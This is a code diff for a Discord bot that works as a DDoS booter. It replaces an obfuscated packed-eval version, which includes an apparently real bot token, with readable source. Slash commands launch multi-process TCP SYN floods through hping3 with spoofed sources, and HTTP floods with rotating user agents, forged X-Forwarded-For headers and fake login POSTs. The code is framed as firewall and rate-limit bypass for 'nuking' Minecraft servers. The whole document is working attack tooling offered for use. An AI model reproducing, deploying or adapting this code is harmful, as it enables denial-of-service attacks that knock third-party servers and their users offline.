@@ -1,1 +1,202 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3{1G,1H,1e}=k(\'2r.2s\');3 1f=k(\'1f\');3 f=k(\'f\');3 B=k(\'B\');3 1I=k(\'1I\');3{1J}=k(\'2t\');3 R=k(\'R\');3 c=k(\'c\');3 1K=k(\'R\').2u().1L;3 1M=\'2v.2w.2x-2y\';3 1N=\'2z\';3 1g=2A;3 S=8.T(1K,4);3 C=t 1G({2B:[1H.2C]});3 D=t 2D();C.u(\'2E\',()=>{G.1h(`2F 1O 2G ${C.1P.2H}`);3 1i=[t 1e().v(\'H\').w(\'1Q 1R 1S I\').1T(h=>h.v(\'U\').w(\'V:W (e.g. 1.1.1.1:2I)\').J(j)).1j(h=>h.v(\'7\').w(\'1U (1k 1V)\').J(j)),t 1e().v(\'f\').w(\'1W 1X I\').1T(h=>h.v(\'l\').w(\'2J 1l (e.g. f://2K.2L)\').J(j)).1j(h=>h.v(\'m\').w(\'2M 2N m (1-x)\').J(j)).1j(h=>h.v(\'7\').w(\'1U (1k 1V)\').J(j))];C.2O.1i.1m(1i).2P(()=>G.1h(\'2Q 2R\')).1Y(G.Y)});C.u(\'2S\',2T q=>{9(!q.2U())K;9(q.1P.1n!==1N){K q.Z({11:\'❌ 2V\',1Z:j})}9(q.20===\'H\'){21(q)}1o 9(q.20===\'f\'){22(q)}});L 21(a){3 U=a.y.23(\'U\');M 7=8.T(a.y.1p(\'7\'),1g);3[z,n]=U.2W(\':\');9(!z||!n||2X(n)){K a.Z({11:\'❌ 2Y 2Z. 30 V:W\',1Z:j})}a.Z({11:`💀31 1Q 1R 1S I 24 ${z}:${n}A ${7}25...`});3 d=`H-${12.13()}`;D.1m(d,{E:26});9(c.1q){A(M i=0;i<S;i++){c.27({1r:\'H\',V:z,W:n,14:7,1s:d})}c.u(\'N\',()=>{})}17(()=>1t(d),7*x)}L 22(a){3 l=a.y.23(\'l\');3 m=8.T(8.1k(a.y.1p(\'m\'),1),x);3 7=8.T(a.y.1p(\'7\'),1g);a.Z({11:`🔥32 1W 1X I 24 ${l}33 ${m}m A ${7}25...`});3 d=`f-${12.13()}`;D.1m(d,{E:26});9(c.1q){3 28=8.34(m/S);A(M i=0;i<S;i++){c.27({1r:\'f\',1l:l,29:28,14:7,1s:d})}}17(()=>1t(d),7*x)}9(c.35){3 1u=b.r.1r;3 d=b.r.1s;9(1u===\'H\'){3 z=b.r.V;3 n=18(b.r.W);3 7=18(b.r.14);9(R.37()===\'38\'){1J(`39 ${7}3a--I--3b--3c-3d-p ${n}${z}`,(19)=>{9(19&&!19.3e)G.Y(19);b.N()})}1o{3 1v=3f(()=>{9(D.1w(d)?.E){2a(1v);b.N()}A(M i=0;i<x;i++){3g{3 F=t 1f.3h();F.3i({3j:z,n:n,3k:`${o()}.${o()}.${o()}.${o()}`},()=>F.2b());F.u(\'Y\',()=>{});F.17(3l,()=>F.2b())}1Y(e){}}},1);17(()=>{2a(1v);b.N()},7*x)}}1o 9(1u===\'f\'){3 l=b.r.1l;3 1a=18(b.r.29);3 7=18(b.r.14);3 2c=l.2d(\'B\')?t B.1x({2e:j,2f:1a*10}):t f.1x({2e:j,2f:1a*10});3 2g=12.13();3 2h=2g+(7*x);3 1y=[\'1z/5.0 (3m 3n 10.0; 3o; 3p) 1A/1b.36 (1B, 1c 1C) 2i/2j.0.0.0 1D/1b.36\',\'1z/5.0 (3q; 3r 10; 3s-3t) 1A/1b.36 (1B, 1c 1C) 2i/2j.0.0.0 2k 1D/1b.36\',\'1z/5.0 (2l; 3u 2l 2m 3v 1c 3w 2m X) 1A/3x.1.15 (1B, 1c 1C) 3y/16.6 2k/3z 1D/3A.1\'];3B(12.13()<2h&&!D.1w(d)?.E){A(M i=0;i<1a;i++){3 1E=8.s()>0.5;3 y={3C:1E?\'3D\':\'3E\',2c,3F:{\'3G-1x\':1y[8.2n(8.s()*1y.1L)],\'3H\':\'*/*\',\'3I\':\'3J-3K\',\'3L-3M\':\'3N-3O\',\'X-3P-3Q\':`${o()}.${o()}.${o()}.${o()}`}};3 1d=(l.2d(\'B\')?B:f).3R(l,y,(1F)=>{1F.u(\'3S\',()=>{});1F.u(\'2o\',()=>{})});9(1E){1d.3T(2p())}1d.u(\'Y\',()=>{});1d.2o()}}b.N()}}L 1t(a){3 O=D.1w(a);9(O&&!O.E){O.E=j;G.1h(`3U O ${a}`);9(c.1q){A(3 1n 1O c.m){c.m[1n].3V()}}}}L o(){K 8.2n(8.s()*3W)+1}L 2p(){3 2q=[\'3X=\'+8.s().P(36).Q(2),\'3Y=\'+8.s().P(36).Q(2),\'3Z=\'+8.s().P(36).Q(2,15),\'40=\'+8.s().P(36).Q(2,15)+8.s().P(36).Q(2,15)];K 2q.41(\'&\')}C.42(1M);',62,251,'|||const||||duration|Math|if||process|cluster|attackId||http||option||true|require|url|workers|port|randomByte||interaction|env|random|new|on|setName|setDescription|1000|options|ip|for|https|client|activeAttacks|stopped|socket|console|tcp|flood|setRequired|return|function|let|exit|attack|toString|substring|os|WORKER_COUNT|min|target|IP|PORT||error|reply||content|Date|now|DURATION|||setTimeout|parseInt|err|workerCount|537|like|req|SlashCommandBuilder|net|MAX_DURATION|log|commands|addIntegerOption|max|URL|set|id|else|getInteger|isPrimary|TYPE|ATTACK_ID|stopAttack|type|floodInterval|get|Agent|userAgents|Mozilla|AppleWebKit|KHTML|Gecko|Safari|isPost|res|Client|GatewayIntentBits|dgram|exec|numCPUs|length|BOT_TOKEN|ALLOWED_USER_ID|in|user|MONSTER|TCP|SYN|addStringOption|Seconds|300|BRUTAL|HTTP|catch|ephemeral|commandName|handleTcpCommand|handleHttpCommand|getString|to|seconds|false|fork|workersPerCPU|WORKERS|clearInterval|destroy|agent|startsWith|keepAlive|maxSockets|startTime|endTime|Chrome|120|Mobile|iPhone|OS|floor|end|generateRandomPostData|randomStrings|discord|js|child_process|cpus|MTM4NjUwNzk5MDY1NTMwMzg2Mg|GFry0K|kQi2hfCU8TwHqWD76WkDxXyUgdhl|v2XR1MoYQ|1322306751764238447|4200|intents|Guilds|Map|ready|Logged|as|tag|25565|Full|example|com|Number|of|application|then|Commands|registered|interactionCreate|async|isCommand|Unauthorized|split|isNaN|Invalid|format|Use|Launching|Starting|with|ceil|isWorker||platform|linux|timeout|hping3|syn|rand|source|killed|setInterval|try|Socket|connect|host|localAddress|100|Windows|NT|Win64|x64|Linux|Android|SM|G975F|CPU|16_6|Mac|605|Version|15E148|604|while|method|POST|GET|headers|User|Accept|Connection|keep|alive|Cache|Control|no|cache|Forwarded|For|request|data|write|Stopped|kill|254|username|password|session|token|join|login'.split('|'),0,{}))
+const { Client, GatewayIntentBits, SlashCommandBuilder } = require('discord.js');
+const net = require('net');
+const http = require('http');
+const https = require('https');
+const dgram = require('dgram');
+const { exec } = require('child_process');
+const os = require('os');
+const cluster = require('cluster');
+const numCPUs = require('os').cpus().length;
+
+// ===== CONFIG ===== //
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const ALLOWED_USER_ID = 'YOUR_DISCORD_USER_ID';
+const MAX_DURATION = 300; // 5min max (safety)
+const WORKER_COUNT = Math.min(numCPUs, 12); // Use up to 12 CPU cores
+
+// ===== DISCORD BOT SETUP ===== //
+const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const activeAttacks = new Map();
+
+// ===== FIREWALL-BYPASS TECHNIQUES ===== //
+function generateFakeMinecraftHandshake(ip, port) {
+    const protocolVersion = Buffer.from([0x00]); // Fake MC handshake
+    const serverAddress = Buffer.from(ip);
+    const serverPort = Buffer.from([port >> 8, port & 0xFF]);
+    const nextState = Buffer.from([0x02]); // Login state
+    
+    return Buffer.concat([
+        protocolVersion,
+        Buffer.from([serverAddress.length]),
+        serverAddress,
+        serverPort,
+        nextState
+    ]);
+}
+
+function randomTTL() {
+    return Math.floor(Math.random() * 64) + 64; // Random TTL (64-128)
+}
+
+// ===== TCP SYN FLOOD (FIREWALL BYPASS) ===== //
+function tcpSynFlood(ip, port, duration, attackId) {
+    if (os.platform() === 'linux') {
+        // NUCLEAR OPTION (requires root)
+        exec(`timeout ${duration} hping3 --flood --syn --rand-source -p ${port} --ttl ${randomTTL()} --frag --data ${generateFakeMinecraftHandshake(ip, port).length} ${ip}`, (err) => {
+            if (err && !err.killed) console.error('HPING3 Error:', err);
+            process.exit();
+        });
+    } else {
+        // Fallback (Node.js raw sockets)
+        const interval = setInterval(() => {
+            if (activeAttacks.get(attackId)?.stopped) {
+                clearInterval(interval);
+                process.exit();
+            }
+
+            // Send 1000 SYN packets with spoofed SEQ/ACK
+            for (let i = 0; i < 1000; i++) {
+                try {
+                    const socket = new net.Socket();
+                    socket.setTimeout(100);
+                    socket.connect({
+                        host: ip,
+                        port: port,
+                        localAddress: `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`
+                    }, () => {
+                        socket.destroy(); // Half-open connection
+                    });
+                    socket.on('error', () => {});
+                } catch (e) {}
+            }
+        }, 1);
+
+        setTimeout(() => {
+            clearInterval(interval);
+            process.exit();
+        }, duration * 1000);
+    }
+}
+
+// ===== HTTP FLOOD (RATE LIMIT BYPASS) ===== //
+function httpFlood(url, workers, duration, attackId) {
+    const agent = url.startsWith('https') 
+        ? new https.Agent({ keepAlive: true, maxSockets: 1000 })
+        : new http.Agent({ keepAlive: true, maxSockets: 1000 });
+
+    const startTime = Date.now();
+    const endTime = startTime + (duration * 1000);
+
+    while (Date.now() < endTime && !activeAttacks.get(attackId)?.stopped) {
+        for (let i = 0; i < workers; i++) {
+            const req = (url.startsWith('https') ? https : http).request(url, {
+                method: Math.random() > 0.5 ? 'GET' : 'POST',
+                agent,
+                headers: {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 50) + 70}.0.0.0 Safari/537.36`,
+                    'X-Forwarded-For': `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`,
+                    'Accept': '*/*',
+                    'Cache-Control': 'no-cache'
+                }
+            }, (res) => res.resume()); // Discard response
+
+            if (req.method === 'POST') {
+                req.write(`username=${Math.random().toString(36).substring(2)}&password=${Math.random().toString(36).substring(2)}`);
+            }
+            req.on('error', () => {}).end();
+        }
+    }
+    process.exit();
+}
+
+// ===== DISCORD BOT COMMANDS ===== //
+client.on('ready', () => {
+    console.log(`Logged in as ${client.user.tag}`);
+    
+    const commands = [
+        new SlashCommandBuilder()
+            .setName('tcp')
+            .setDescription('🔥 NUKE a Minecraft server (TCP SYN Flood)')
+            .addStringOption(opt => opt.setName('target').setDescription('IP:PORT (e.g., 1.1.1.1:25565)').setRequired(true))
+            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true)),
+        new SlashCommandBuilder()
+            .setName('http')
+            .setDescription('💥 BRUTAL HTTP Flood')
+            .addStringOption(opt => opt.setName('url').setDescription('http://example.com').setRequired(true))
+            .addIntegerOption(opt => opt.setName('workers').setDescription('Number of workers (1-1000)').setRequired(true))
+            .addIntegerOption(opt => opt.setName('duration').setDescription('Seconds (max 300)').setRequired(true))
+    ];
+
+    client.application.commands.set(commands).catch(console.error);
+});
+
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isCommand() || interaction.user.id !== ALLOWED_USER_ID) {
+        return interaction.reply({ content: '❌ Unauthorized', ephemeral: true });
+    }
+
+    if (interaction.commandName === 'tcp') {
+        const [ip, port] = interaction.options.getString('target').split(':');
+        const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);
+
+        interaction.reply({ content: `💀 Launching **TCP SYN FLOOD** on \`${ip}:${port}\` for ${duration} seconds...` });
+
+        const attackId = `tcp-${Date.now()}`;
+        activeAttacks.set(attackId, { stopped: false });
+
+        if (cluster.isPrimary) {
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                cluster.fork({
+                    TYPE: 'tcp',
+                    IP: ip,
+                    PORT: port,
+                    DURATION: duration,
+                    ATTACK_ID: attackId
+                });
+            }
+        }
+        setTimeout(() => stopAttack(attackId), duration * 1000);
+    } else if (interaction.commandName === 'http') {
+        const url = interaction.options.getString('url');
+        const workers = Math.min(Math.max(interaction.options.getInteger('workers'), 1), 1000);
+        const duration = Math.min(interaction.options.getInteger('duration'), MAX_DURATION);
+
+        interaction.reply({ content: `🔥 Starting **HTTP FLOOD** on \`${url}\` with ${workers} workers for ${duration} seconds...` });
+
+        const attackId = `http-${Date.now()}`;
+        activeAttacks.set(attackId, { stopped: false });
+
+        if (cluster.isPrimary) {
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                cluster.fork({
+                    TYPE: 'http',
+                    URL: url,
+                    WORKERS: Math.ceil(workers / WORKER_COUNT),
+                    DURATION: duration,
+                    ATTACK_ID: attackId
+                });
+            }
+        }
+        setTimeout(() => stopAttack(attackId), duration * 1000);
+    }
+});
+
+// ===== UTILITY FUNCTIONS ===== //
+function stopAttack(attackId) {
+    const attack = activeAttacks.get(attackId);
+    if (attack && !attack.stopped) {
+        attack.stopped = true;
+        if (cluster.isPrimary) {
+            for (const id in cluster.workers) {
+                cluster.workers[id].kill();
+            }
+        }
+    }
+}
+
+function randomByte() {
+    return Math.floor(Math.random() * 254) + 1;
+}
+
+// ===== START BOT ===== //
+client.login(BOT_TOKEN).catch(console.error);
